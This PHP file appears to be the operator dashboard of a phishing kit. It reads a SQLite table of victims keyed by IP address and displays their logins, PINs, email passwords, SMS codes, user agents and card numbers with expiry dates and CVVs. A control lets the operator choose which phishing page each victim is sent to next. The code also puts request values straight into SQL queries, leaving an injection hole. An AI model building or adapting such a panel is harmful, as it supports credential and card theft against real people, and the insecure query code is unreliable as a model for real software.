<?php
session_start();
if(!$_SESSION["login"]) {
   header("Location: login.php"); die();
}

  class MyDB extends SQLite3 {
      function __construct() {
         $this->open('db.db');
      }
   }
   $db = new MyDB();
   if(!$db) {
      echo $db->lastErrorMsg();
   } else {
      //echo "Opened database successfully\n";
   }
$userip =$_REQUEST['ip'];

   $sql ="SELECT * from user where IP='$userip';";

   $ret = $db->query($sql);
   while($row = $ret->fetchArray(SQLITE3_ASSOC) ) {
      $ip =$row['ip'];
      $user =$row['user'];
      $pass =$row['pin'];
      $mobile =$row['mobile'];
      $sms =$row['sms'];
      $cle =$row['cle'];
      $code =$row['code'];
      $check =$row['appckeck'];
      $agent =$row['useragent'];
      $page =$row['pagere'];
      $sms2 =$row['sms2'];
      $cc =$row['ccnum'];
      $date =$row['datecc'];
      $cvv =$row['cvv'];
      $cc2 =$row['ccnum2'];
      $date2 =$row['datecc2'];
      $cvv2 =$row['cvv2'];
      $cc3 =$row['ccnum3'];
      $date3 =$row['datecc3'];
      $cvv3 =$row['cvv3'];
      $email =$row['email'];
      $emailpass=$row['emailpass'];
      $comment =$row['comment'];
      $datelog=$row['datelog'];

   }

   if (isset($_POST['submit'])) {
    $commnt =$_POST['comment'];
    $sqls ="UPDATE user  set comment ='$commnt'  where IP='$userip';";
   $rets = $db->exec($sqls);
   if(!$rets) {
      echo $db->lastErrorMsg();
   } else {
      $db->changes();
      header("Refresh:0");
   }
   }

   $db->close();



?>
<html lang="en" dir=""><head><meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Dashboard v1 | Gull Admin Template</title>
    <link href="https://fonts.googleapis.com/css?family=Nunito:300,400,400i,600,700,800,900" rel="stylesheet">
    <link href="css/themes/lite-purple.min.css" rel="stylesheet">
    <link href="css/plugins/perfect-scrollbar.min.css" rel="stylesheet">
    <style type="text/css">
        [class*=" i-"], [class^="i-"] {
    font-family: "iconsmind" !important;
    speak: none;
    font-style: normal;
    font-weight: bold;
    font-variant: normal;
    text-transform: none;
    line-height: 1;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}
.dark-theme a {
    color: #ffffff !important;
}

.dark-theme input {
    background: #262c49 !important;
    border-color: #10163a;
    color: white;
}
    </style>
</head>

<body class="text-left dark-theme">
    <div class="app-admin-wrap layout-horizontal-bar">
        <div class="main-header">
            <div class="logo"><img src="images/logo.png" alt=""></div>
            <div class="menu-toggle">
                <div></div>
                <div></div>
                <div></div>
            </div>
            
            <div style="margin: auto"></div>
            
        </div>
        <!-- header top menu end-->
        <div class="horizontal-bar-wrap">
            <div class="header-topnav">
                <div class="container-fluid">
                    <div class="topnav rtl-ps-none ps" id="" data-perfect-scrollbar="" data-suppress-scroll-x="true">
                        <ul class="menu float-left">
                               <li>
                                <div>
                                    <div>
                                       <a href="index.php">User</a>
                                        
                                        
                                    </div>
                                </div>
                            </li>
                            <li>
                                <div>
                                    <div>
                                      <a href="email.php">Email</a>
                                        
                                        
                                    </div>
                                </div>
                            </li>
                            <!-- end ui kits-->
                            <li>
                                <div>
                                    <div>
                                       <a href="mobile.php">Phone number</a>
                                        
                                        
                                    </div>
                                </div>
                            </li>
                            
                            
          
                        </ul>
                    <div class="ps__rail-x" style="left: 0px; bottom: 0px;"><div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div></div><div class="ps__rail-y" style="top: 0px; height: 48px; right: 0px;"><div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 4px;"></div></div><div class="ps__rail-x" style="left: 0px; bottom: 0px;"><div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div></div><div class="ps__rail-y" style="top: 0px; height: 48px; right: 0px;"><div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 4px;"></div></div><div class="ps__rail-x" style="left: 0px; bottom: 0px;"><div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div></div><div class="ps__rail-y" style="top: 0px; right: 0px;"><div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div></div><div class="ps__rail-x" style="left: 0px; bottom: 0px;"><div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div></div><div class="ps__rail-y" style="top: 0px; right: 0px;"><div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div></div></div>
                </div>
            </div>
        </div>
        <!-- =============== Horizontal bar End ================-->
        <div class="main-content-wrap d-flex flex-column">
            <!-- ============ Body content start ============= -->
            <div class="main-content">            
<div class="row">


                            <div class="col-lg-6">
                                <div class="card">
                                    <div class="card-header">
                                        <strong>IP :  </strong><?php echo $userip;?> ------- <b>date : </b> <?php echo $datelog;?></div>
                                    <div class="card-body card-block">
                                        <form action="" method="post"  class="form-horizontal">

<div class="row form-group">
                                                <div class="col col-md-3">
                                                    <label class=" form-control-label">Login</label>
                                                </div>
                                                <div class="col-12 col-md-9">
                                                    <p class="form-control-static"><?php echo $user;?></p>
                                                </div>
                                            </div>
<div class="row form-group">
                                                <div class="col col-md-3">
                                                    <label class=" form-control-label">Password</label>
                                                </div>
                                                <div class="col-12 col-md-9">
                                                    <p class="form-control-static"><?php echo $pass;  ?></p>
                                                </div>
                                            </div>
<div class="row form-group">
                                                <div class="col col-md-3">
                                                    <label class=" form-control-label">Mobile</label>
                                                </div>
                                                <div class="col-12 col-md-9">
                                                    <p class="form-control-static"><?php echo $mobile; ?></p>
                                                </div>
                                            </div>
                                            <div class="row form-group">
                                                                                            <div class="col col-md-3">
                                                                                                <label class=" form-control-label">Email</label>
                                                                                            </div>
                                                                                            <div class="col-12 col-md-9">
                                                                                                <p class="form-control-static"><?php echo $email; ?></p>
                                                                                            </div>
                                                                                        </div>
                                  <div class="row form-group">
                                                                                                                                        <div class="col col-md-3">
                                                                                                                                            <label class=" form-control-label">Email pass</label>
                                                                                                                                        </div>
                                                                                                                                        <div class="col-12 col-md-9">
                                                                                                                                            <p class="form-control-static"><?php echo $emailpass; ?></p>
                                                                                                                                        </div>
                                                                                                                                    </div>
<div class="row form-group">
                                                <div class="col col-md-3">
                                                    <label class=" form-control-label">SMS 1</label>
                                                </div>
                                                <div class="col-12 col-md-9">
                                                    <p class="form-control-static"><?php echo $sms; ?></p>
                                                </div>
                                            </div>

<div class="row form-group">
                                                <div class="col col-md-3">
                                                    <label class=" form-control-label">SMS 2</label>
                                                </div>
                                                <div class="col-12 col-md-9">
                                                    <p class="form-control-static"><?php echo $sms2; ?></p>
                                                </div>
                                            </div>
<div class="row form-group">
                                                <div class="col col-md-3">
                                                    <label class=" form-control-label">Valid APP</label>
                                                </div>
                                                <div class="col-12 col-md-9">
                                                    <select name="appcheck" id="select" class="form-control">
                                                        <option value="<?php echo $check; ?>"><?php echo $check; ?></option>
                                                        <option value="yes">yes</option>
                                                        <option value="no">no</option>
                                                    </select>
                                                </div>
                                            </div>
<div class="row form-group">
                                                <div class="col col-md-3">
                                                    <label for="select" class=" form-control-label">Page</label>
                                                </div>
                                                <div class="col-12 col-md-9">
                                                    <select name="page" id="select" class="form-control">
                                                        <option value="<?php echo $page;  ?>"><?php echo $page;  ?></option>
                                                        <option value="cle.php">Cle.php</option>
                                                        <option value="app.php">App.php</option>
                                                        <option value="sms.php">Sms.php</option>
                                                    </select>
                                                </div>
                                            </div><div class="row form-group">
                                                <div class="col col-md-3">
                                                    <label class=" form-control-label">Cle</label>
                                                </div>
                                                <div class="col-12 col-md-9">
                                                    <input type="text" id="cle" name="cle" value="<?php echo $cle; ?>" placeholder="Enter cle" class="form-control">

                                                </div>
                                            </div>
                                            <div class="row form-group">
                                                <div class="col col-md-3">
                                                    <label class=" form-control-label">Commentaire</label>
                                                </div>
                                                <div class="col-12 col-md-9">
                                                    <input type="text" id="comment" name="comment" value="<?php echo $comment; ?>" placeholder="Enter commentaire" class="form-control">

                                                </div>
                                            </div>


                                            <div class="row form-group">
                                                <div class="col col-md-3">
                                                    <label class=" form-control-label">User agent</label>
                                                </div>
                                                <div class="col-12 col-md-9">
                                                    <p class="form-control-static"><?php echo $agent;  ?></p>
                                                </div>
                                            </div>












                                            <div class="row form-group">
                                                       <button type="submit" name="submit" class="btn btn-primary">Submit</button>

                                                                                </div>




                                        </form>
                                    </div>

                                </div>

                            </div>

                            <div class="col-lg-6">
                                                            <div class="card">
                                                                <div class="card-header">Credit Card</div>
                                                                <div class="card-body">


                                                                    <form action="" method="post" novalidate="novalidate">


                                                                        <div class="form-group">
                                                                            <label for="cc-number" class="control-label mb-1">Card number</label>
                                                                            <input id="cc-number" name="cc-number" type="tel" class="form-control cc-number identified visa" value="<?php echo $cc;  ?>" readonly>

                                                                        </div>
                                                                        <div class="row">
                                                                            <div class="col-6">
                                                                                <div class="form-group">
                                                                                    <label for="cc-exp" class="control-label mb-1">Expiration</label>
                                                                                    <input id="cc-exp" name="cc-exp" type="tel" class="form-control cc-exp" value="<?php echo $date;  ?>" readonly>

                                                                                </div>
                                                                            </div>
                                                                            <div class="col-6">
                                                                                <label for="x_card_code" class="control-label mb-1">Security code</label>
                                                                                <div class="input-group">
                                                                                    <input id="x_card_code" name="x_card_code" type="tel" class="form-control cc-cvc" value="<?php echo $cvv;  ?>" readonly>

                                                                                </div>
                                                                            </div>
                                                                        </div>

                                                                    </form>
                                                                </div>
                                                            </div>
                                               


                                                        </div>









                        </div>
                <!-- end of main-content -->
            </div><!-- Footer Start -->
            <div class="flex-grow-1"></div>
            
            <!-- fotter end -->
        </div>
    </div><!-- ============ Search UI Start ============= -->
    
    <!-- ============ Search UI End ============= -->
    <script src="js/plugins/jquery-3.3.1.min.js"></script>
    <script src="js/plugins/bootstrap.bundle.min.js"></script>
    <script src="js/plugins/perfect-scrollbar.min.js"></script>
    <script src="js/scripts/script.min.js"></script>
    <script src="js/scripts/sidebar-horizontal.script.js"></script>
    <script src="js/plugins/echarts.min.js"></script>
    <script src="js/scripts/echart.options.min.js"></script>
    <script src="js/scripts/dashboard.v1.script.min.js"></script>




</body></html>